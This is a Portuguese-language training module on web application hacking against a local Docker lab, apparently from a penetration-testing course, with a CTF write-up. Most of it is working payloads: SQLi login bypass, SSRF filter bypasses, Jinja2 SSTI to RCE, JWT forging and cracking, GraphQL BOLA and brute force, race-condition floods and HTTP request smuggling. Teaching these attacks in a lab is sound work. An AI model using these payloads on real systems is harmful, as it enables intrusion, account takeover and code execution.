# 🕸️ MÓDULO 2 — Web Application Hacking

> **MITRE ATT&CK:** T1190, T1059, T1078, T1556, T1539

## 🎯 Objetivos de Aprendizado

Ao final deste módulo você será capaz de:

1. Mapear toda a superfície de ataque de uma aplicação web moderna (front-end SPA + APIs REST/GraphQL).
2. Explorar **OWASP Top 10:2025** em ambiente realista, com SQLi avançado, autenticação quebrada, IDOR, SSRF, RCE e ataques à cadeia de suprimentos de software.
3. Atacar **APIs**: bypass de auth via JWT mal-implementado, abuso de introspection no GraphQL, mass assignment.
4. Executar **SSTI** em Jinja2 e Twig até RCE completo.
5. Conduzir **Race Conditions** e **HTTP Request Smuggling** entre proxy reverso e backend.
6. Bypass de WAF moderno (ModSecurity/CRS) com encoding, fragmentação e abuso de parsing.

## 📖 Teoria Mínima — A Web Mudou, Os Ataques Também

A web de 2026 é radicalmente diferente da de 2010. Hoje você raramente encontra um PHP monolítico — encontra **SPA React + API REST + microsserviços + CDN + WAF na frente**. Isso muda o jogo de três formas:

- **A vulnerabilidade migrou da renderização para a API.** SQLi e XSS clássicos diminuíram; em compensação, **IDOR**, **broken object-level authorization (BOLA)**, **mass assignment** e **JWT mal feito** estão por toda parte. A **OWASP API Security Top 10 (edição 2023)** hoje captura essa realidade melhor que o Web Top 10.
- **O perímetro virou camada.** Você não tem só "o servidor" — tem CDN, edge cache, WAF, proxy reverso, gateway de API, e só depois o backend. Cada **fronteira** entre eles é uma oportunidade de ataque (HTTP smuggling, cache deception, host header injection).
- **A cadeia de suprimentos virou alvo principal.** A nova edição do **OWASP Top 10:2025** trouxe *Software Supply Chain Failures* (A03) como categoria dedicada — typosquatting de pacotes, dependências comprometidas, builds não-reprodutíveis. SolarWinds, xz-utils, event-stream: todos do mesmo padrão.

### As 10 categorias do OWASP Top 10:2025 (referência rápida)

| # | Categoria | Coberto neste módulo |
|---|---|---|
| A01 | Broken Access Control | ✅ IDOR/BOLA (Ex. 2.2.6) |
| A02 | Security Misconfiguration | ✅ GraphQL introspection ON, debug mode |
| A03 | **Software Supply Chain Failures** 🆕 | ✅ Discussão + lab no Capstone |
| A04 | Cryptographic Failures | ✅ JWT HS256 com segredo fraco (Ex. 2.2.5) |
| A05 | Injection | ✅ SQLi, SSTI, NoSQL (Ex. 2.2.2, 2.2.4) |
| A06 | Insecure Design | ✅ Race condition em redeem (Ex. 2.2.7) |
| A07 | Authentication Failures | ✅ JWT alg:none, login bypass |
| A08 | Software or Data Integrity Failures | ✅ Recap no Capstone |
| A09 | Security Logging and Alerting Failures | 🟡 Coberto no Módulo 9 |
| A10 | **Mishandling of Exceptional Conditions** 🆕 | ✅ Race + erro vazando stacktrace |

> 🆕 = categorias novas/consolidadas em 2025 vs. 2021. *Server-Side Request Forgery* (SSRF), que era A10 em 2021, foi absorvido por *Broken Access Control* e *Insecure Design*; aqui continuamos tratando SSRF como tópico próprio (Ex. 2.2.3) por ser pedagogicamente útil.

Três princípios que vão guiar este módulo:

1. **Pense em estado, não só em entrada.** XSS é entrada → saída. IDOR é entrada → autorização → estado. Os bugs caros vivem na lógica.
2. **Toda fronteira é uma oportunidade.** Se há um proxy na frente, há discordância entre como ele e o backend interpretam HTTP. Procure essa discordância.
3. **APIs vazam mais do que UIs.** O JS-bundle do front-end já te entrega 80% das rotas e DTOs do backend. Comece sempre extraindo isso.

---

## 🐳 2.1 — Lab Setup: Aplicação ACME Multi-Camada

O lab simula uma stack moderna: SPA + API REST + API GraphQL + proxy reverso vulnerável a smuggling + um app Flask isolado para SSTI/SSRF.

📄 **[docker-compose.yml](docker-compose.yml)** — orquestra todos os contêineres
📄 **[ssti-app/Dockerfile](ssti-app/Dockerfile)** + **[ssti-app/app.py](ssti-app/app.py)** — Flask vulnerável a SSTI/SSRF/IDOR
📄 **[graphql-api/Dockerfile](graphql-api/Dockerfile)** + **[graphql-api/server.js](graphql-api/server.js)** + **[graphql-api/package.json](graphql-api/package.json)** — API GraphQL com introspection, JWT fraco e BOLA
📄 **[smuggle-lab/Dockerfile](smuggle-lab/Dockerfile)** + **[smuggle-lab/haproxy.cfg](smuggle-lab/haproxy.cfg)** + **[smuggle-lab/backend.js](smuggle-lab/backend.js)** — front HAProxy + back Node com TE/CL desync

### Topologia

```
                  webnet (172.40.0.0/24)
                          │
              ┌───────────┼─────────────┬────────────────┬──────────────┐
              │           │             │                │              │
       [attacker]   [juice-shop]   [ssti-app]    [graphql-api]   [smuggle-front]
        .10            .20           .30              .40              .50
                                                                        │
                                                              [smuggle-back .60]
```

### Subir o lab

```bash
cd ~/cyber/module-2
docker compose up -d --build

# Sanidade — abra do host (apenas as portas mapeadas em loopback):
# (escolhemos portas não-triviais para evitar conflito com outros serviços dev)
curl -s http://127.0.0.1:13371/ | head -c 200     # Juice Shop
curl -s http://127.0.0.1:13372/ | head -c 200     # SSTI app
curl -s http://127.0.0.1:13373/healthz            # GraphQL API
curl -s http://127.0.0.1:13374/                   # HAProxy front (smuggle)

# Entrar no atacante:
docker exec -it attacker bash
```

> 💡 Todo tráfego do atacante passa pela `webnet`; nenhuma porta vulnerável é exposta para a Internet do host (só para `127.0.0.1`), evitando que sua máquina vire alvo real.

---

## 🛠️ 2.2 — Exercícios Práticos

### Exercício 2.2.1 — Recon de superfície de ataque

```bash
docker exec -it attacker bash

# Descoberta de diretórios em alta velocidade:
ffuf -u http://172.40.0.20/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302 -t 100

# Descoberta de subdomínios virtuais (Host header):
ffuf -u http://172.40.0.20/ -H "Host: FUZZ.acme.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 6850

# Extração de endpoints do bundle JS (Juice Shop SPA):
curl -s http://172.40.0.20/main.js | grep -oE '"/api/[^"]+"' | sort -u
```

> 🎓 **Truque:** o `-fs` (filter size) elimina respostas com o tamanho exato do "404 padrão". Sempre rode primeiro um request com chave inexistente e meça o tamanho.

### Exercício 2.2.2 — SQLi avançado no Juice Shop (login bypass + UNION)

Juice Shop tem uma página de login clássica em `/#/login`. Capture o request com Burp/curl:

```bash
# Bypass de autenticação via SQLi clássico:
curl -s -X POST http://172.40.0.20/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"' OR 1=1--","password":"x"}'
# Resposta inclui token JWT de admin
```

Para extração de dados via UNION-based:

```bash
# Endpoint vulnerável de busca:
curl -s "http://172.40.0.20/rest/products/search?q=')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--"
```

> 🎯 Ferramenta automatizada quando manual não compensa: `sqlmap -u "..." --level 5 --risk 3 --random-agent --tamper=between,space2comment`.

### Exercício 2.2.3 — SSRF com bypass de filtro de localhost

A `ssti-app` tem um endpoint `/fetch?url=` que tenta filtrar `127.0.0.1`/`localhost`. Bypasses clássicos:

```bash
# 1) IP em decimal (127.0.0.1 = 2130706433):
curl "http://172.40.0.30/fetch?url=http://2130706433/internal/admin"

# 2) IPv6 mapped:
curl "http://172.40.0.30/fetch?url=http://[::ffff:7f00:1]/internal/admin"

# 3) DNS rebinding via host externo (em pentest real). Para o lab basta:
curl "http://172.40.0.30/fetch?url=http://0.0.0.0/internal/admin"

# 4) Pivoting interno (acessar GraphQL via SSRF):
curl "http://172.40.0.30/fetch?url=http://172.40.0.40:4000/graphql?query=%7B__typename%7D"
```

### Exercício 2.2.4 — SSTI em Jinja2 → RCE

A `ssti-app` renderiza o parâmetro `name` direto no template. Caminho clássico:

```bash
# 1) Detecção inocente:
curl "http://172.40.0.30/hello?name=\{\{7*7\}\}"
# Se retornar "Hello 49" → Jinja2 confirmado.

# 2) Sondagem de classes:
curl --data-urlencode "name={{ ''.__class__.__mro__[1].__subclasses__() }}" "http://172.40.0.30/hello"

# 3) RCE — payload curto que funciona em Jinja2 moderno:
curl -G --data-urlencode "name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}" "http://172.40.0.30/hello"

# 4) Versão cyclic-import-safe (em alguns Flask):
curl -G --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}" "http://172.40.0.30/hello"
```

### Exercício 2.2.5 — Atacando JWT no GraphQL API

A `graphql-api` emite JWT assinado com **HS256 e segredo fraco** (`secret`). Vulnerabilidades a explorar:

```bash
# 1) Pegue um token válido logando como user comum:
TOKEN=$(curl -s -X POST http://172.40.0.40:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{login(email:\"bob@acme.local\",password:\"bob123\"){token}}"}' | jq -r '.data.login.token')
echo $TOKEN

# 2) Tente ataque "alg:none":
python3 -c "
import json, base64
header = base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(b'{\"sub\":1,\"role\":\"admin\"}').rstrip(b'=').decode()
print(f'{header}.{payload}.')
"

# 3) Cracking offline com hashcat (segredo fraco):
echo $TOKEN > /tmp/jwt.txt
hashcat -a 0 -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt --quiet
# Esperado: secret recuperado em segundos.

# 4) Forjar token admin com segredo descoberto (use jwt.io ou pyjwt):
python3 -c "
import jwt
print(jwt.encode({'sub':1,'role':'admin'}, 'secret', algorithm='HS256'))
"
```

### Exercício 2.2.6 — GraphQL: introspection, depth e BOLA

```bash
# 1) Introspection — extrair schema completo:
curl -s -X POST http://172.40.0.40:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' | jq .

# 2) BOLA (Broken Object Level Authorization) — ler order de outro usuário:
curl -s -X POST http://172.40.0.40:4000/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{order(id:1){id total user{email}}}"}'

# 3) Query batching para brute-force sem rate limit:
curl -s -X POST http://172.40.0.40:4000/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(email:\"alice@acme.local\",password:\"123\"){token}}"},
       {"query":"mutation{login(email:\"alice@acme.local\",password:\"alice2026\"){token}}"}]'
```

### Exercício 2.2.7 — Race Condition em endpoint de cupom

A `graphql-api` permite resgatar um cupom uma única vez por conta — mas a checagem é assíncrona. Dispare 30 requests paralelas:

```bash
# Pegue o token e gere disparos paralelos:
seq 30 | xargs -I{} -P30 curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST http://172.40.0.40:4000/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{redeem(code:\"FREE10\"){balance}}"}'

# Saldo final reflete múltiplos resgates → race vencida.
```

> 💡 Em pentest real, use **Burp Turbo Intruder** com `single-packet attack` (HTTP/2 multiplexing) — chega a janela de 1ms entre requests.

### Exercício 2.2.8 — HTTP Request Smuggling (TE.CL desync)

`smuggle-lab` é um HAProxy 2.0 com config legacy + backend Node. Ele aceita `Transfer-Encoding: chunked` no front mas o backend respeita `Content-Length`. Payload TE.CL clássico:

```bash
# Use ncat para preservar a request raw:
printf 'POST / HTTP/1.1\r\n'\
'Host: 172.40.0.50\r\n'\
'Content-Length: 4\r\n'\
'Transfer-Encoding: chunked\r\n'\
'\r\n'\
'1c\r\n'\
'GPOST / HTTP/1.1\r\n'\
'X-Smuggled: yes\r\n'\
'\r\n'\
'0\r\n\r\n' | ncat 172.40.0.50 80

# A próxima request legítima de outro usuário será concatenada com o "GPOST" smuggled.
# Repita com requests benignas em paralelo para "sequestrar" a sessão de outro:
while true; do curl -s http://172.40.0.50/ > /dev/null; done
```

> 🎓 Para detecção sistemática use **smuggler.py** (defparam) ou a extensão *HTTP Request Smuggler* do Burp.

---

## 🚩 2.3 — Desafio CTF "ACME Web Heist"

> **Cenário:** A ACME Corp pediu pentest em sua plataforma de e-commerce. Sua única entrada é o IP `172.40.0.20` (Juice Shop), mas a flag está em `/flag.txt` dentro do contêiner `ssti-app`, que **não está exposto** ao seu acesso direto na rede do CTF (imagine uma rede interna).
>
> **Para fins do lab**, simule a restrição assim: prometa não chamar diretamente `172.40.0.30`. Toda interação com a `ssti-app` precisa passar pelo Juice Shop ou pelo GraphQL.

**Requisitos:**
1. Conseguir token de admin no Juice Shop **e** no GraphQL.
2. Usar SSRF a partir do Juice Shop ou do GraphQL para alcançar a `ssti-app`.
3. Explorar SSTI para ler `/flag.txt`.

**Flag esperada:** `flag{...}`

---

<details>
<summary>🔓 <b>Write-up — só abra depois de tentar!</b></summary>

### Caminho da exploração

```
[attacker]
   │  (1) SQLi login → admin token Juice Shop
   │  (2) Crack JWT GraphQL (HS256/secret) → forge admin
   │  (3) Endpoint do GraphQL com SSRF (proxyFetch) → http://172.40.0.30/fetch
   │  (4) SSRF aninhado: /fetch?url=http://localhost/hello?name={{...SSTI...}}
   │  (5) RCE via Jinja2 → cat /flag.txt
   ▼
flag{web_chain_owns_full_stack}
```

### Passo 1 — Admin no Juice Shop

```bash
curl -s -X POST http://172.40.0.20/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR 1=1 ORDER BY id--\",\"password\":\"x\"}" | jq .
```

### Passo 2 — Forjar JWT admin no GraphQL

```bash
# Cracking:
TOK=$(curl -s -X POST http://172.40.0.40:4000/graphql -H "Content-Type: application/json" \
  -d '{"query":"mutation{login(email:\"bob@acme.local\",password:\"bob123\"){token}}"}' | jq -r '.data.login.token')

echo $TOK > /tmp/jwt.txt
hashcat -a 0 -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt --quiet
# segredo: secret

python3 -c "import jwt; print(jwt.encode({'sub':1,'role':'admin'}, 'secret', algorithm='HS256'))"
ADMIN=$( ... )
```

### Passo 3 — SSRF a partir do GraphQL

A `graphql-api` expõe a mutation `proxyFetch(url: String!)` (acessível só a admin). Use o token forjado:

```bash
curl -s -X POST http://172.40.0.40:4000/graphql \
  -H "Authorization: Bearer $ADMIN" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{proxyFetch(url:\"http://172.40.0.30/hello?name={{cycler.__init__.__globals__.os.popen(%27cat /flag.txt%27).read()}}\")}"}'
```

A resposta retorna o conteúdo do `/flag.txt` renderizado pelo template Jinja2 da `ssti-app`.

### Passo 4 — Capturar a flag

```
flag{web_chain_owns_full_stack}
```

### Lições

- **Encadeamento é o que diferencia engenharia de exploit:** três bugs médios viraram crítico quando combinados.
- **Encoding em SSRF aninhado** importa: você precisa que o `?name=` sobreviva ao fetch interno **e** ao parser do template.
- **Admin no GraphQL ≠ admin no Juice Shop** — sempre rode os dois ataques. Nunca presuma "admin é admin".

</details>

---

## 🚩 2.4 — Desafio Bônus "Cache Deception"

> Configure (modificando o `haproxy.cfg`) um cache que normaliza `/account.php` e `/account.php/style.css` como o mesmo objeto. Force a vítima a cachear sua resposta autenticada como se fosse um asset estático e leia-a de outra sessão.

Aberto. Submeta solução em `/shared/notes/cache-deception.md`. Tópico revisitado no Capstone.

---

## 🧰 Toolbox do Módulo 2

| Ferramenta | Versão testada | Uso |
|---|---|---|
| Burp Suite Community/Pro | 2025.x | Proxy de interceptação |
| ffuf | 2.1.0 | Fuzz de diretórios e parâmetros |
| sqlmap | 1.8 | SQLi automatizado |
| jwt_tool | 2.2.6 | Forge/crack/test de JWT |
| hashcat | 6.2.6 | Cracking offline (modo 16500 = JWT HS256) |
| GraphQL Voyager | 1.0+ | Visualização de schema |
| Inql / Clairvoyance | latest | GraphQL recon |
| smuggler.py (defparam) | latest | Detecção de smuggling |
| OWASP ZAP | 2.15 | Alternativa open-source ao Burp |
| Wapiti | 3.1.7 | Scanner de webapp em CLI |

---

## 🐛 Troubleshooting

| Sintoma | Causa | Correção |
|---|---|---|
| Juice Shop sobe mas crasha em segundos | RAM insuficiente para o Node de 2GB | Aumente memória do Docker Desktop ≥ 6GB |
| `ffuf` retorna tudo 200 (false positives) | Servidor responde a qualquer rota com 200 | Use `-fs` ou `-mr` para regex de conteúdo |
| Payload Jinja2 não dispara RCE | Sandboxed via `jinja2.sandbox.SandboxedEnvironment` | Tente bypass com `lipsum.__globals__` ou troque app — o lab não está em sandbox |
| `hashcat -m 16500` não acha o segredo | Token usa RS256, não HS256 | Confirme com `jwt_tool token.jwt -T` antes de tentar crack |
| HTTP smuggling não funciona | HAProxy moderno (2.4+) corrige por padrão | Confirme versão do compose; o lab fixa em `haproxy:2.0.31` |
| GraphQL retorna sempre `null` em queries | Schema requer Auth header | Reinclua `Authorization: Bearer ...` |

---

## 📚 Recursos Extras

- 📘 **Livro:** *The Web Application Hacker's Handbook* — Stuttard & Pinto (clássico, ainda relevante)
- 📘 **Livro:** *Real-World Bug Hunting* — Peter Yaworski
- 🎓 **Plataforma:** [PortSwigger Web Security Academy](https://portswigger.net/web-security) — gratuito, **leia tudo**
- 🔗 [OWASP Top 10:2025 (Web)](https://owasp.org/Top10/2025/)
- 🔗 [OWASP API Security Top 10 (2023)](https://owasp.org/API-Security/editions/2023/en/0x00-header/) — última edição estável da série API
- 🔗 [Diferenças OWASP Top 10 2021 → 2025](https://owasp.org/Top10/2025/0x00_2025-Introduction/)
- 🎥 **Vídeo:** *Live HTTP Request Smuggling* — James Kettle (DEF CON / BlackHat)
- 📄 **Paper:** *Exploiting URL Parsing Confusion Attacks* — Orange Tsai
- 🔗 [HackTricks — Web Pentesting](https://book.hacktricks.xyz/pentesting-web)

## ✅ Checklist do Módulo 2

- [ ] Subiu o lab e validou as 4 aplicações alvo
- [ ] Capturou admin token no Juice Shop via SQLi
- [ ] Crackou o segredo HS256 do GraphQL
- [ ] Explorou SSRF com pelo menos 2 bypasses diferentes
- [ ] Conseguiu RCE via SSTI Jinja2
- [ ] Reproduziu uma race condition vencendo o servidor
- [ ] Demonstrou TE.CL HTTP smuggling
- [ ] Capturou a flag CTF "ACME Web Heist"
- [ ] Documentou tudo em `/shared/notes/modulo-2.md`

---

> Quando concluir, prossiga para o **Módulo 3 — Wireless & Mobile Hacking**.
